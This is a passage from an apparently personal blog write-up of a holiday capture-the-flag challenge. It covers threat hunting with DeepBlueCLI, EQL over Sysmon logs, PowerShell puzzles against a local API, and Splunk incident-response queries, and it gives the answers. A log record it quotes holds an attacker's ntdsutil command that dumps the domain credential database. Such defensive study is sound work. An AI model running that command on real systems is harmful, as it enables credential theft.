On windows: change execution policy as admin</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#8be9fd;font-style:italic">Set-ExecutionPolicy</span> -ExecutionPolicy Unrestricted
</code></pre></td></tr></table>
</div>
</div><p>Then download threat hunting too lfrom github</p>
<pre tabindex="0"><code>git clone https://github.com/sans-blue-team/DeepBlueCLI
.\DeepBlue.ps1 .\Security.evtx .\evtx\password-spray.evtx
</code></pre><h2 id="objective---windows-log-analysis-determine-attacker-technique">Objective - windows log analysis: determine attacker technique</h2>
<ul>
<li><a href="https://www.endgame.com/our-experts/ross-wolf">EQL blog</a></li>
<li><a href="https://pen-testing.sans.org/blog/2019/12/10/eql-threat-hunting/">EQL Threat Hunting</a></li>
<li><a href="https://www.darkoperator.com/blog/2014/8/8/sysinternals-sysmon">Sysmon by Carlos Perez</a></li>
</ul>
<p>We install eql and we search for *process_name <code>lsass.exe</code></p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">pip<span style="color:#bd93f9">3</span> install eql
eql query -f .\sysmon-data.json <span style="color:#f1fa8c">&#34;parent_process_name == &#39;lsass.exe&#39;&#34;</span>
{<span style="color:#ff79c6">&#34;command_line&#34;</span>: <span style="color:#f1fa8c">&#34;C:\\Windows\\system32\\cmd.exe&#34;</span>, <span style="color:#ff79c6">&#34;event_type&#34;</span>: <span style="color:#f1fa8c">&#34;process&#34;</span>, <span style="color:#ff79c6">&#34;logon_id&#34;</span>: <span style="color:#bd93f9">999</span>, <span style="color:#ff79c6">&#34;parent_process_name&#34;</span>: <span style="color:#f1fa8c">&#34;lsass.exe&#34;</span>, <span style="color:#ff79c6">&#34;parent_process_path&#34;</span>: <span style="color:#f1fa8c">&#34;C:\\Windows\\System32\\lsass.exe&#34;</span>, <span style="color:#ff79c6">&#34;pid&#34;</span>: <span style="color:#bd93f9">3440</span>, <span style="color:#ff79c6">&#34;ppid&#34;</span>: <span style="color:#bd93f9">632</span>, <span style="color:#ff79c6">&#34;process_name&#34;</span>: <span style="color:#f1fa8c">&#34;cmd.exe&#34;</span>, <span style="color:#ff79c6">&#34;process_path&#34;</span>: <span style="color:#f1fa8c">&#34;C:\\Windows\\System32\\cmd.exe&#34;</span>, <span style="color:#ff79c6">&#34;subtype&#34;</span>: <span style="color:#f1fa8c">&#34;create&#34;</span>, <span style="color:#ff79c6">&#34;timestamp&#34;</span>: <span style="color:#bd93f9">132186398356220000</span>, <span style="color:#ff79c6">&#34;unique_pid&#34;</span>: <span style="color:#f1fa8c">&#34;{7431d376-dedb-5dd3-0000-001027be4f00}&#34;</span>, <span style="color:#ff79c6">&#34;unique_ppid&#34;</span>: <span style="color:#f1fa8c">&#34;{7431d376-cd7f-5dd3-0000-001013920000}&#34;</span>, <span style="color:#ff79c6">&#34;user&#34;</span>: <span style="color:#f1fa8c">&#34;NT AUTHORITY\\SYSTEM&#34;</span>, <span style="color:#ff79c6">&#34;user_domain&#34;</span>: <span style="color:#f1fa8c">&#34;NT AUTHORITY&#34;</span>, <span style="color:#ff79c6">&#34;user_name&#34;</span>: <span style="color:#f1fa8c">&#34;SYSTEM&#34;</span>}
</code></pre></td></tr></table>
</div>
</div><p>Once the process identified we take the pid to search children processes, and we identify ntdsutil.exe</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">eql query -f .\sysmon-data.json <span style="color:#f1fa8c">&#34;ppid == 3440&#34;</span>
{<span style="color:#ff79c6">&#34;command_line&#34;</span>: <span style="color:#f1fa8c">&#34;ntdsutil.exe  \&#34;ac i ntds\&#34; ifm \&#34;create full c:\\hive\&#34; q q&#34;</span>, <span style="color:#ff79c6">&#34;event_type&#34;</span>: <span style="color:#f1fa8c">&#34;process&#34;</span>, <span style="color:#ff79c6">&#34;logon_id&#34;</span>: <span style="color:#bd93f9">999</span>, <span style="color:#ff79c6">&#34;parent_process_name&#34;</span>: <span style="color:#f1fa8c">&#34;cmd.exe&#34;</span>, <span style="color:#ff79c6">&#34;parent_process_path&#34;</span>: <span style="color:#f1fa8c">&#34;C:\\Windows\\System32\\cmd.exe&#34;</span>, <span style="color:#ff79c6">&#34;pid&#34;</span>: <span style="color:#bd93f9">3556</span>, <span style="color:#ff79c6">&#34;ppid&#34;</span>: <span style="color:#bd93f9">3440</span>, <span style="color:#ff79c6">&#34;process_name&#34;</span>: <span style="color:#f1fa8c">&#34;ntdsutil.exe&#34;</span>, <span style="color:#ff79c6">&#34;process_path&#34;</span>: <span style="color:#f1fa8c">&#34;C:\\Windows\\System32\\ntdsutil.exe&#34;</span>, <span style="color:#ff79c6">&#34;subtype&#34;</span>: <span style="color:#f1fa8c">&#34;create&#34;</span>, <span style="color:#ff79c6">&#34;timestamp&#34;</span>: <span style="color:#bd93f9">132186398470300000</span>, <span style="color:#ff79c6">&#34;unique_pid&#34;</span>: <span style="color:#f1fa8c">&#34;{7431d376-dee7-5dd3-0000-0010f0c44f00}&#34;</span>, <span style="color:#ff79c6">&#34;unique_ppid&#34;</span>: <span style="color:#f1fa8c">&#34;{7431d376-dedb-5dd3-0000-001027be4f00}&#34;</span>, <span style="color:#ff79c6">&#34;user&#34;</span>: <span style="color:#f1fa8c">&#34;NT AUTHORITY\\SYSTEM&#34;</span>, <span style="color:#ff79c6">&#34;user_domain&#34;</span>: <span style="color:#f1fa8c">&#34;NT AUTHORITY&#34;</span>, <span style="color:#ff79c6">&#34;user_name&#34;</span>: <span style="color:#f1fa8c">&#34;SYSTEM&#34;</span>}
</code></pre></td></tr></table>
</div>
</div><h2 id="powershell">Powershell</h2>
<ul>
<li><a href="https://blogs.sans.org/pen-testing/files/2016/05/PowerShellCheatSheet_v41.pdf">SANS Powershell Cheat Sheet</a></li>
</ul>
<p>List all env variables, we find a <code>riddle</code> variable:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#8be9fd;font-style:italic">Get-Content</span> /home/call...
<span style="color:#8be9fd;font-style:italic">Get-History</span>
(<span style="color:#8be9fd;font-style:italic">Invoke-WebRequest</span> http://127.0.0.1:1225/api/off).RawContent
<span style="color:#8be9fd;font-style:italic">Invoke-History</span> -ID 7
<span style="color:#8be9fd;font-style:italic">Invoke-History</span> -ID 9
(<span style="color:#8be9fd;font-style:italic">Get-ChildItem</span> env:riddle).Value
<span style="color:#8be9fd;font-style:italic">gci </span>-rec <span style="color:#ff79c6">-file</span> /etc | <span style="color:#8be9fd;font-style:italic">sort </span>LastWriteTime
</code></pre></td></tr></table>
</div>
</div><p>last file is an archive:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#8be9fd;font-style:italic">Expand-Archive</span> /etc/apt/archive  -DestinationPath ./archive
chmod +x ./runme.elf
./runme.elf
</code></pre></td></tr></table>
</div>
</div><p>set refraction?val=1.867</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">(<span style="color:#8be9fd;font-style:italic">Invoke-WebRequest</span> -Uri http://localhost:1225/api/refraction<span style="color:#ff79c6">?</span>val=1.867).RawContent
</code></pre></td></tr></table>
</div>
</div><p>We are informed to search recursively for the hash &lsquo;25520151A320B5B0D21561F92C8F6224&rsquo; in the home folder</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#8be9fd;font-style:italic">$goodHashes</span> = @(
    <span style="color:#f1fa8c">&#39;25520151A320B5B0D21561F92C8F6224&#39;</span>
)
(<span style="color:#8be9fd;font-style:italic">gci </span>-rec <span style="color:#ff79c6">-file</span> . | <span style="color:#8be9fd;font-style:italic">Get-FileHash</span> -Algorithm MD5 | <span style="color:#8be9fd;font-style:italic">Where-Object</span> { <span style="color:#8be9fd;font-style:italic">$_</span>.Hash -in <span style="color:#8be9fd;font-style:italic">$goodHashes</span> }).Path
</code></pre></td></tr></table>
</div>
</div><p>Read content of the file</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#8be9fd;font-style:italic">Get-Content</span> /home/elf/depths/produce/thhy5hll.txt
(<span style="color:#8be9fd;font-style:italic">Invoke-WebRequest</span> -Uri http://localhost:1225/api/temperature<span style="color:#ff79c6">?</span>val=-33.5).RawContent
</code></pre></td></tr></table>
</div>
</div><p>we are now instructed to find the longest file name</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">(<span style="color:#8be9fd;font-style:italic">gci </span>-rec <span style="color:#ff79c6">-file</span> . | <span style="color:#8be9fd;font-style:italic">select </span>Fullname,@{Name=<span style="color:#f1fa8c">&#34;NameLength&#34;</span>;Expression={<span style="color:#8be9fd;font-style:italic">$_</span>.fullname.length}} | <span style="color:#8be9fd;font-style:italic">sort </span>NameLength -Descending | <span style="color:#8be9fd;font-style:italic">select </span>-first 1).FullName
<span style="color:#8be9fd;font-style:italic">Get-Content</span> /home/elf/depths/larger/cloud/behavior/beauty/enemy/produce/age/chair/unknown/escape/vote/long/writer/behind/ahead/thin/occasionally/explore/tape/wherever/practical/therefore/cool/plate/ice/play/truth/potatoes/beauty/fourth/careful/dawn/adult/either/burn/<span style="color:#ff79c6">end</span>/accurate/rubbed/cake/main/she/threw/eager/trip/to/soon/think/fall/is/greatest/become/accident/labor/sail/dropped/fox/0jhj5xz6.txt
</code></pre></td></tr></table>
</div>
</div><p>We are now inform to add username in Get-Process output and kill processes in a certain order</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#8be9fd;font-style:italic">Get-Process</span> -IncludeUsername
<span style="color:#8be9fd;font-style:italic">Stop-Process</span> -ID 24
<span style="color:#8be9fd;font-style:italic">Stop-Process</span> -ID 25
<span style="color:#8be9fd;font-style:italic">Stop-Process</span> -ID 27
<span style="color:#8be9fd;font-style:italic">Stop-Process</span> -ID 29
<span style="color:#8be9fd;font-style:italic">Get-Content</span> /shall/see
</code></pre></td></tr></table>
</div>
</div><p>Get the .xml children of /etc - an event log to be found.</p>
<p>Group all .Id&rsquo;s and the last thing will be in the Properties of the lonely unique event Id.</p>
<p>we are now informed to look for an xml event log file somewhere in /etc</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#8be9fd;font-style:italic">gci </span> /etc  -rec <span style="color:#ff79c6">-file</span> -filter *.xml
<span style="color:#6272a4">#$xml = Get-Content /etc/systemd/system/timers.target.wants/EventLog.xml</span>
<span style="color:#8be9fd;font-style:italic">$MyNamespace</span> = @{o = <span style="color:#f1fa8c">&#34;http://schemas.microsoft.com/powershell/2004/04&#34;</span>}
(<span style="color:#8be9fd;font-style:italic">Select-Xml</span> -path /etc/systemd/system/timers.target.wants/EventLog.xml -Namespace <span style="color:#8be9fd;font-style:italic">$MyNamespace</span> -Xpath <span style="color:#f1fa8c">&#34;//o:I32[@N[contains(., &#39;Id&#39;)]]&#34;</span>).Node.InnerText | <span style="color:#8be9fd;font-style:italic">Group-Object</span> | <span style="color:#8be9fd;font-style:italic">Sort-Object</span> Count
</code></pre></td></tr></table>
</div>
</div><p>We find that the unique Id = 1</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">(<span style="color:#8be9fd;font-style:italic">Select-Xml</span> -Namespace <span style="color:#8be9fd;font-style:italic">$MyNamespace</span> -path /etc/systemd/system/timers.target.wants/EventLog.xml -Xpath <span style="color:#f1fa8c">&#34;//o:Obj[o:Props/o:I32[@N=&#39;Id&#39;] = &#39;1&#39;]/o:Props&#34;</span>) | <span style="color:#ff79c6">foreach</span> { <span style="color:#8be9fd;font-style:italic">$_</span>.Node.InnerText}
<span style="color:#6272a4">#$correct_gases_postbody = @{`n    O=6`n    H=7`n    He=3`n    N=4`n    Ne=22`n    Ar=11`n    Xe=10`n    F=20`n    Kr=8`n    Rn=9`n}`n</span>
(<span style="color:#8be9fd;font-style:italic">Invoke-WebRequest</span> -Method POST -BODY <span style="color:#f1fa8c">&#34;O=6&amp;H=7&amp;He=3&amp;N=4&amp;Ne=22&amp;Ar=11&amp;Xe=10&amp;F=20&amp;Kr=8&amp;Rn=9&#34;</span> -Uri http://localhost:1225/api/gas).RawContent
(<span style="color:#8be9fd;font-style:italic">Invoke-WebRequest</span> http://127.0.0.1:1225/api/on).RawContent
(<span style="color:#8be9fd;font-style:italic">Invoke-WebRequest</span> http://127.0.0.1:1225/api/output).RawContent
</code></pre></td></tr></table>
</div>
</div><h2 id="splunk">SPLUNK</h2>
<p>We are invited to connect <code>https://splunk.elfu.org</code> with username <code>elf</code> and password <code>elfsocks</code>. Once connected we go through a chat with different SOC stakeholders trying to respond an incident. We have to answer one challenge question and 7 training questions. First answer is in the chat, but other questions requires us to download a splunk file.</p>
<ul>
<li>Splunk is located there: <a href="https://www.youtube.com/watch?v=qbIhHhRKQCw">Splunk</a>
<ul>
<li>listing types of data in Splunk
<ul>
<li><code>|metadata type=sourcetypes</code></li>
<li><code>| tstats values(sourcetype) where index=*</code></li>
</ul>
</li>
<li>PIDs are in hex</li>
<li>sourcetype=wineventlog EventCode=4688 &ndash;&gt; Process auditing with full command-line and arguments</li>
<li>index=main sourcetype=&ldquo;XmlWinEventLog:Microsoft-Windows-Sysmon/Operational&rdquo; | stats count by EventCode, EventDescription | sort -count</li>
<li>pivoting in time -&gt; click timestamp and appluy +/- 5 seconds</li>
</ul>
</li>
<li><a href="https://www.splunk.com/en_us/blog/security/a-salacious-soliloquy-on-sysmon.html">Sysmon</a>
<ul>
<li>Olaf Hartong&rsquo;s config file for Sysmon (to be googled)</li>
</ul>
</li>
<li>Stoq
<ul>
<li><a href="https://stoq.punchcyber.com/">Stoq website</a></li>
<li><a href="https://www.sans.org/cyber-security-summit/archives/file/summit-archive-1492181136.pdf">SANS pdf talk</a></li>
</ul>
</li>
</ul>
<h3 id="training-quetions">training quetions:</h3>
<ol>
<li>
<p>sweetums</p>
</li>
<li>
<p>C:\Users\cbanas\Documents\Naughty_and_Nice_2019_draft.txt</p>
<pre><code>index=main cbanas sourcetype=&quot;WinEventLog:Microsoft-Windows-Powershell/Operational&quot; ParameterBinding*Get_Item*=&quot;\*&quot;
| top 100 ParameterBinding*Get_Item*
</code></pre>
</li>
<li>
<p>144.202.46.214.vultr.com</p>
<pre><code>index=main sourcetype=&quot;XmlWinEventLog:Microsoft-Windows-Sysmon/Operational&quot; dest=&quot;\*&quot; | top 10 dest
</code></pre>
</li>
<li>
<p>19th Century Holiday Cheer Assignment.docm</p>
<ul>
<li>
<p>Look for powershell script:</p>
<pre><code>index=main sourcetype=&quot;WinEventLog:Microsoft-Windows-Powershell/Operational&quot; | reverse
</code></pre>
</li>
<li>
<p>click on the date/timestamp from that first event, and specify a time window.
Accept the default of +/- five seconds, them remove sourcetype and reverse</p>
<pre><code>index=main sourcetype=WinEventLog EventCode=4688
</code></pre>
</li>
<li>
<p>hex PIDs are 0x2248=8776 child_of 0x16e8=5864 child of 0xc10=3088, New_Process_ID is in hex while sysmon process_id is in decimal, so we have to convert those hex value into a decimal</p>
<pre><code>index=main sourcetype=WinEventLog EventCode=4688 | eval hex_convert_pid=tonumber(New_Process_ID,16)
index=main process_id=&quot;5864&quot; | stats count by file_path
</code></pre>
</li>
<li>
<p>will list three files but those are not the parent powershell script</p>
<pre><code>index=main process_id=&quot;5864&quot; eventtype=&quot;ms-sysmon-process&quot;` we find the parent_process_id = 3088
</code></pre>
</li>
<li>
<p>there is a powershell payload encoded in base64 =&gt; <code>payload.decode('base64').replace('\x00','').lower()</code></p>
</li>
<li>
<p>All the above PIDs did not help, instead setting the time filter to show all events before the powershell script call,
then look for <code>EventCode=4688</code> and used <code>| reverse</code> to order by time desc.
Going back in time until we find a sysmon event with a <code>Process_Command_Line</code> containing a weird <code>\*.docm</code> in a zipfile.</p>
<pre><code>New_Process_Id = 0x187c
</code></pre>
</li>
</ul>
</li>
<li>
<p>21 unique email addresses</p>
<ul>
<li>
<p>Find file attachments</p>
<pre><code>index=main sourcetype=stoq
| eval results=spath(\_raw,&quot;results{}&quot;)
| mvexpand results
| eval path=spath(results, &quot;archivers.filedir.path&quot;), filename=spath(results,&quot;payload_meta.extra_data.filename&quot;), fullpath=path.&quot;/&quot;.filename
| search fullpath!=&quot;&quot;
| table filename,fullpath
</code></pre>
</li>
<li>
<p>Find emails</p>
<pre><code>index=main sourcetype=stoq
| table \_time results{}.workers.smtp.to results{}.workers.smtp.from results{}.workers.smtp.subject results{}.workers.smtp.body
| sort - \_time
</code></pre>
</li>
<li>
<p>Find all students having submitted their assignments:</p>
<pre><code>index=main sourcetype=stoq results{}.workers.smtp.subject=&quot;holiday cheer assignment submission&quot;
| table results{}.workers.smtp.from
</code></pre>
</li>
</ul>
</li>
<li>
<p>123456789</p>
<pre><code>index=main sourcetype=stoq results{}.payload_meta.extra_data.filename=&quot;\*zip&quot; results{}.workers.smtp.subject=&quot;holiday cheer assignment submission&quot;
| table results{}.workers.smtp.body
</code></pre>
</li>
<li>
<p><a href="mailto:bradly.buttercups@eifu.org">bradly.buttercups@eifu.org</a></p>
</li>
</ol>
<h3 id="challenge-question">challenge question:</h3>
<p>the solution is: <strong>Kent you are so unfair. And we were going to make you the king of the Winter Carnival.</strong></p>
<pre><code>index=main sourcetype=stoq &quot;results{}.workers.smtp.from&quot;=&quot;bradly buttercups &lt;bradly.buttercups@eifu.org&gt;&quot;

index=main sourcetype=stoq &quot;results{}.workers.smtp.from&quot;=&quot;bradly buttercups &lt;bradly.buttercups@eifu.org&gt;&quot;
  | eval results = spath(\_raw, &quot;results{}&quot;)
  | mvexpand results
  | eval path=spath(results, &quot;archivers.filedir.path&quot;), filename=spath(results, &quot;payload_meta.extra_data.filename&quot;), fullpath=path.&quot;/&quot;.filename
  | search fullpath!=&quot;&quot;
  | table filename,fullpath
</code></pre>
<ul>
<li>We find an interested core.xml file that we found on the File Archive &hellip; happy news, it cointains the message to Kent</li>
</ul>
<h2 id="rita---real-intelligence-threat-analytics">RITA - Real Intelligence Threat Analytics</h2>
<ul>
<li><a href="https://www.youtube.com/watch?v=jxOZ5u2CYWw">RITA Youtube</a></li>
<li><a href="https://www.youtube.com/embed/JoWzkcEotA8?start=63&amp;feature=oembed">RITA demo Youtube</a></li>
<li><a href="https://www.activecountermeasures.com/free-tools/rita/">RITA website</a></li>
<li><a href="https://github.com/activecm/rita">GIT</a></li>
</ul>
<p>According to website, The framework ingests Bro/Zeek Logs, and currently supports the following major features:</p>
<ul>
<li>Beaconing Detection: Search for signs of beaconing behavior in and out of your network</li>
<li>DNS Tunneling Detection: Search for signs of DNS based covert channels</li>
<li>Blacklist Checking: Query blacklists to search for suspicious domains and hosts</li>
</ul>
<p>To setup our environment, we download the logs and RITA framework:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
